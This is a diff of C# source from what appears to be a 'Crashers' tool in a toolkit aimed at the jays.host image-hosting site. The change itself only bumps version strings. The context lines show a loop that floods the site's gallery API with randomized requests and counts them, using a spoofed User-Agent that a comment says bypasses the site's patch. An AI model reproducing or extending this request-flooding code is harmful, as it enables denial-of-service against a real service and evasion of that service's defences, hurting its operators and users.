@@ -18,7 +18,7 @@ namespace Jays.Host_Toolkit.Tools.Crashers
             tryAgain:
             try
             {
-                Title = "Jays.Host Toolkit | Made by Verity | Version 1.0, Build 01/20/22 | Current Tool: Method 4";
+                Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/24/22 | Current Tool: Method 4";
             
                 Utils.LoadingSequence();
             
@@ -60,7 +60,7 @@ namespace Jays.Host_Toolkit.Tools.Crashers
             {
                 try
                 {
-                    Title = "Jays.Host Toolkit | Made by Verity | Version 1.0, Build 01/20/22 | Current Tool: Method 4 | Requests Sent: " + _requestsSent;
+                    Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/24/22 | Current Tool: Method 4 | Requests Sent: " + _requestsSent;
                     var sex = random.Next(0, 7);
                     var galleryEndpoint = WebRequest.Create($"https://jays.host/api/v1/gallery/personal/1?filter={options[sex]}&search=");
                     galleryEndpoint.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win69; x64; rv:47.0) Gecko/20100101 Firefox/47.0"); // Bypass Jays awesome patch.
